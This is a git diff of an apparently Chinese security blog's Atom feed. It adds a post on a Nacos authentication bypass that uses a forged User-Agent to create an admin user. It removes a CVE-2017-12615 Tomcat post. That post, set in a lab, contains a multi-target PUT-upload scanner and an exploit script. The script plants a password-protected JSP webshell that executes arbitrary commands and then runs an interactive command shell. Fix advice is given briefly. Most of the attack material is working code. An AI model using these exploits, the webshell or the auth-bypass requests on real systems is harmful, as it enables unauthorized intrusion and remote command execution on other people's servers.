@@ -1,4 +1,22 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-23T12:47:20+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">帆软V8文件上传漏洞</title><link href="http://localhost:4000/vul/finereport/" rel="alternate" type="text/html" title="帆软V8文件上传漏洞" /><published>2023-10-23T00:00:00+08:00</published><updated>2023-10-23T00:00:00+08:00</updated><id>http://localhost:4000/vul/finereport</id><content type="html" xml:base="http://localhost:4000/vul/finereport/"><![CDATA[<p>遇到的一个帆软V8文件上传漏洞，url得加上<code class="language-plaintext highlighter-rouge">/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin</code>才能正常访问，不然是空白页</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-21T11:06:52+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">Nacos身份认证绕过漏洞</title><link href="http://localhost:4000/vul/nacos/" rel="alternate" type="text/html" title="Nacos身份认证绕过漏洞" /><published>2023-11-21T00:00:00+08:00</published><updated>2023-11-21T00:00:00+08:00</updated><id>http://localhost:4000/vul/nacos</id><content type="html" xml:base="http://localhost:4000/vul/nacos/"><![CDATA[<h1 id="nacos身份认证绕过漏洞">Nacos身份认证绕过漏洞</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为<code class="language-plaintext highlighter-rouge">Nacos-Server</code>时可绕过认证，添加新用户。</p>
+
+<h2 id="0x01-poc">0x01 POC</h2>
+<p>添加<code class="language-plaintext highlighter-rouge">User-Agent: Nacos-Server</code>后访问<code class="language-plaintext highlighter-rouge">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>可以看到返回值为200,且内容中是否包含<code class="language-plaintext highlighter-rouge">pageItems</code></p>
+
+<p><img src="/images/vul/nacos/1.png" alt="" /></p>
+
+<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>
+<p>添加<code class="language-plaintext highlighter-rouge">User-Agent: Nacos-Server</code>后使用POST方法请求                       <br />
+<code class="language-plaintext highlighter-rouge">http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj</code>
+添加一个新用户</p>
+
+<p><img src="/images/vul/nacos/2.png" alt="" /></p>
+
+<p>用创建的用户名和密码成功登录后台</p>
+
+<p><img src="/images/vul/nacos/3.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="nacos" /><category term="nday" /><summary type="html"><![CDATA[Nacos身份认证绕过漏洞 0x00 漏洞概述 Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。]]></summary></entry><entry><title type="html">帆软V8文件上传漏洞</title><link href="http://localhost:4000/vul/finereport/" rel="alternate" type="text/html" title="帆软V8文件上传漏洞" /><published>2023-10-23T00:00:00+08:00</published><updated>2023-10-23T00:00:00+08:00</updated><id>http://localhost:4000/vul/finereport</id><content type="html" xml:base="http://localhost:4000/vul/finereport/"><![CDATA[<p>遇到的一个帆软V8文件上传漏洞，url得加上<code class="language-plaintext highlighter-rouge">/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin</code>才能正常访问，不然是空白页</p>
 
 <p><img src="/images/vul/FineReport/1.png" alt="" /></p>
 
@@ -1432,183 +1450,4 @@ exploit
 <h2 id="0x05-参考">0x05 参考</h2>
 <p>https://www.chaitin.cn/zh/ghostcat</p>
 
-<p>https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&amp;mid=2247485009&amp;idx=1&amp;sn=5f619c27ec994949f5fa69d41d2dee05&amp;chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1584439554350&amp;sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd</p>]]></content><author><name>yueyejian</name></author><category term="[&quot;vul&quot;]" /><category term="tomcat" /><category term="web" /><category term="ajp" /><category term="lfi" /><summary type="html"><![CDATA[CVE-2020-1938 - Ghostcat 0x00 漏洞概述 Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。]]></summary></entry><entry><title type="html">CVE-2017-12615 - Tomcat任意文件写入</title><link href="http://localhost:4000/vul/CVE-2017-12615/" rel="alternate" type="text/html" title="CVE-2017-12615 - Tomcat任意文件写入" /><published>2023-04-15T00:00:00+08:00</published><updated>2023-04-15T00:00:00+08:00</updated><id>http://localhost:4000/vul/CVE-2017-12615</id><content type="html" xml:base="http://localhost:4000/vul/CVE-2017-12615/"><![CDATA[<h1 id="cve-2017-12615---tomcat任意文件写入">CVE-2017-12615 - Tomcat任意文件写入</h1>
-<h2 id="环境搭建">环境搭建</h2>
-<p>用vulhub的环境</p>
-
-<p><img src="/images/vulhub/CVE-2017-12615/0.png" alt="" /></p>
-
-<p><img src="/images/vulhub/CVE-2017-12615/1.png" alt="" /></p>
-
-<p>查看配置文件conf/web.xml中readonly的设置</p>
-
-<p><img src="/images/vulhub/CVE-2017-12615/2.png" alt="" /></p>
-
-<h2 id="漏洞复现">漏洞复现</h2>
-<p>访问主页，抓包后修改数据包</p>
-
-<p><img src="/images/vulhub/CVE-2017-12615/3.png" alt="" /></p>
-
-<p>可通过 PUT 方式创建一个 JSP 文件。虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code class="language-plaintext highlighter-rouge">/</code>）来绕过了限制。</p>
-
-<p>改完包的时候不知道为啥上传失败了，于是我换了buuoj的环境，上传冰蝎的jsp木马，返回201代表上传成功</p>
-
-<p><img src="/images/vulhub/CVE-2017-12615/4.png" alt="" /></p>
-
-<p>再用冰蝎连接即可</p>
-
-<p><img src="/images/vulhub/CVE-2017-12615/5.png" alt="" /></p>
-
-<p>Windows服务器上搭建的tomcat可以在文件尾部加上 %20或者 ::$DATA等绕过</p>
-
-<h2 id="poc--exp">POC &amp;&amp; EXP</h2>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#CVE-2017-12615 POC
-</span><span class="kn">import</span> <span class="n">requests</span>
-<span class="kn">import</span> <span class="n">optparse</span>
-<span class="kn">import</span> <span class="n">os</span>
-
-<span class="n">parse</span> <span class="o">=</span> <span class="n">optparse</span><span class="p">.</span><span class="nc">OptionParser</span><span class="p">(</span><span class="n">usage</span> <span class="o">=</span> <span class="sh">'</span><span class="s">python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-u</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--url</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">URL</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target url</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--port</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">PORT</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target port[default:8080]</span><span class="sh">'</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">8080</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-f</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">FILE</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target list</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="n">options</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="n">parse</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
-<span class="c1">#print(options)
-#验证参数是否完整
-</span><span class="nf">if </span><span class="p">(</span><span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">PORT</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE]</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
-        <span class="nf">exit</span><span class="p">(</span><span class="sh">'</span><span class="s">CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="n">filename</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/hello.jsp</span><span class="sh">'</span>
-
-<span class="c1">#测试数据
-</span><span class="n">data</span> <span class="o">=</span> <span class="sh">'</span><span class="s">hello</span><span class="sh">'</span>
-
-<span class="c1">#提交PUT请求
-#resp = requests.post(url1,headers=headers,data=data)
-</span>
-<span class="c1">#验证文件是否上传成功
-#response = requests.get(url2)
-#上传文件
-</span><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
-  <span class="k">try</span><span class="p">:</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
-    <span class="k">return</span> <span class="mi">1</span>
-  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] {0} 连接失败</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
-    <span class="k">return</span> <span class="mi">0</span>
-<span class="k">def</span> <span class="nf">checking</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
-  <span class="k">try</span><span class="p">:</span>
-    <span class="c1">#验证文件是否上传成功
-</span>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">filename</span><span class="p">)</span>
-    <span class="c1">#print(url+filename)
-</span>    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="sh">'</span><span class="s">hello</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
-      <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] {0} 存在CVE-2017-12615 Tomcat 任意文件读写漏洞</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
-    <span class="k">else</span><span class="p">:</span>
-      <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] {0} 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
-  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-                <span class="c1">#print(e)
-</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] {0} 连接失败</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
-<span class="k">if</span> <span class="n">options</span><span class="p">.</span><span class="n">FILE</span> <span class="ow">and</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">):</span>
-  <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">urls</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
-    <span class="c1">#print(urls)
-</span>    <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">:</span>
-      <span class="n">url</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
-      <span class="k">if</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="nf">checking</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="k">elif</span> <span class="n">options</span><span class="p">.</span><span class="n">FILE</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">):</span>
-  <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] {0} 文件不存在</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">))</span>
-<span class="k">else</span><span class="p">:</span>
-  <span class="c1">#上传链接
-</span>  <span class="n">url</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="o">+</span><span class="n">options</span><span class="p">.</span><span class="n">PORT</span>
-  <span class="k">if</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="nf">checking</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-
-</code></pre></div></div>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#CVE-2017-12615 EXP
-</span><span class="kn">import</span> <span class="n">requests</span>
-<span class="kn">import</span> <span class="n">optparse</span>
-<span class="kn">import</span> <span class="n">time</span>
-
-
-<span class="n">parse</span> <span class="o">=</span> <span class="n">optparse</span><span class="p">.</span><span class="nc">OptionParser</span><span class="p">(</span><span class="n">usage</span> <span class="o">=</span> <span class="sh">'</span><span class="s">python3 %prog [-h] [-u URL] [-p PORT]</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-u</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--url</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">URL</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target url</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--port</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">PORT</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target port[default:8080]</span><span class="sh">'</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">8080</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="n">options</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="n">parse</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
-<span class="c1">#验证参数是否完整
-</span><span class="k">if</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">PORT</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
-        <span class="nf">exit</span><span class="p">(</span><span class="sh">'</span><span class="s">CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="n">url</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="o">+</span><span class="n">options</span><span class="p">.</span><span class="n">PORT</span>
-<span class="n">filename</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/backdoor.jsp</span><span class="sh">'</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">filename</span><span class="o">+</span><span class="sh">'</span><span class="s">?pwd=023&amp;i=</span><span class="sh">'</span>
-
-<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><span class="sh">"</span><span class="p">}</span>
-<span class="c1">#木马
-</span><span class="n">data</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">&lt;%
-    if(</span><span class="sh">"</span><span class="s">023</span><span class="sh">"</span><span class="s">.equals(request.getParameter(</span><span class="sh">"</span><span class="s">pwd</span><span class="sh">"</span><span class="s">))){
-        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(</span><span class="sh">"</span><span class="s">i</span><span class="sh">"</span><span class="s">)).getInputStream();
-        int a = -1;
-        byte[] b = new byte[2048];
-        out.print(</span><span class="sh">"</span><span class="s">&lt;pre&gt;</span><span class="sh">"</span><span class="s">);
-        while((a=in.read(b))!=-1){
-            out.println(new String(b));
-        }
-        out.print(</span><span class="sh">"</span><span class="s">&lt;/pre&gt;</span><span class="sh">"</span><span class="s">);
-    }
-
-%&gt;</span><span class="sh">'''</span>
-<span class="c1">#上传木马文件
-</span><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
-  <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] 目标地址:</span><span class="sh">'</span><span class="o">+</span><span class="n">url</span><span class="p">)</span>
-  <span class="k">try</span><span class="p">:</span>
-    <span class="n">respond</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
-    <span class="c1">#print(respond.status_code)
-</span>    <span class="k">if</span> <span class="n">respond</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span> <span class="ow">or</span> <span class="n">respond</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">204</span><span class="p">:</span>
-      <span class="c1">#print('[*] 目标地址:'+url)
-</span>      <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] 木马上传成功</span><span class="sh">'</span><span class="p">)</span>
-  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] 上传失败</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">return</span> <span class="mi">0</span>
-
-<span class="c1">#命令执行
-</span><span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cmd</span><span class="p">):</span>
-  <span class="k">try</span><span class="p">:</span>
-    <span class="n">respond</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="n">cmd</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">respond</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-      <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">respond</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;pre&gt;</span><span class="sh">"</span><span class="p">,</span><span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;/pre&gt;</span><span class="sh">"</span><span class="p">,</span><span class="sh">""</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
-
-  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] 命令执行错误</span><span class="sh">'</span><span class="p">)</span>
-<span class="k">if</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="nf">exit</span><span class="p">()</span>
-<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">输入执行命令(quit退出):</span><span class="sh">'</span><span class="p">)</span>
-<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
-  <span class="n">cmd</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt;</span><span class="sh">'</span><span class="p">)</span>
-  <span class="nf">if</span><span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="sh">'</span><span class="s">quit</span><span class="sh">'</span><span class="p">):</span>
-    <span class="k">break</span>
-  <span class="nf">attack</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span>
-</code></pre></div></div>
-<p><img src="/images/vulhub/CVE-2017-12615/6.png" alt="" /></p>
-
-<h2 id="修复建议">修复建议</h2>
-<ul>
-  <li>
-    <p>设置conf/web.xml 文件的 readOnly 值为 Ture</p>
-  </li>
-  <li>
-    <p>禁用 PUT 方法并重启 tomcat 服务（如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。）</p>
-  </li>
-  <li>
-    <p>升级到最新版本</p>
-  </li>
-  <li>
-    <p>使用WAF产品进行防御</p>
-  </li>
-</ul>]]></content><author><name>yueyejian</name></author><category term="[&quot;vul&quot;]" /><category term="tomcat" /><category term="web" /><summary type="html"><![CDATA[CVE-2017-12615 - Tomcat任意文件写入 环境搭建 用vulhub的环境]]></summary></entry></feed>
+<p>https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&amp;mid=2247485009&amp;idx=1&amp;sn=5f619c27ec994949f5fa69d41d2dee05&amp;chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1584439554350&amp;sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd</p>]]></content><author><name>yueyejian</name></author><category term="[&quot;vul&quot;]" /><category term="tomcat" /><category term="web" /><category term="ajp" /><category term="lfi" /><summary type="html"><![CDATA[CVE-2020-1938 - Ghostcat 0x00 漏洞概述 Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。]]></summary></entry></feed>
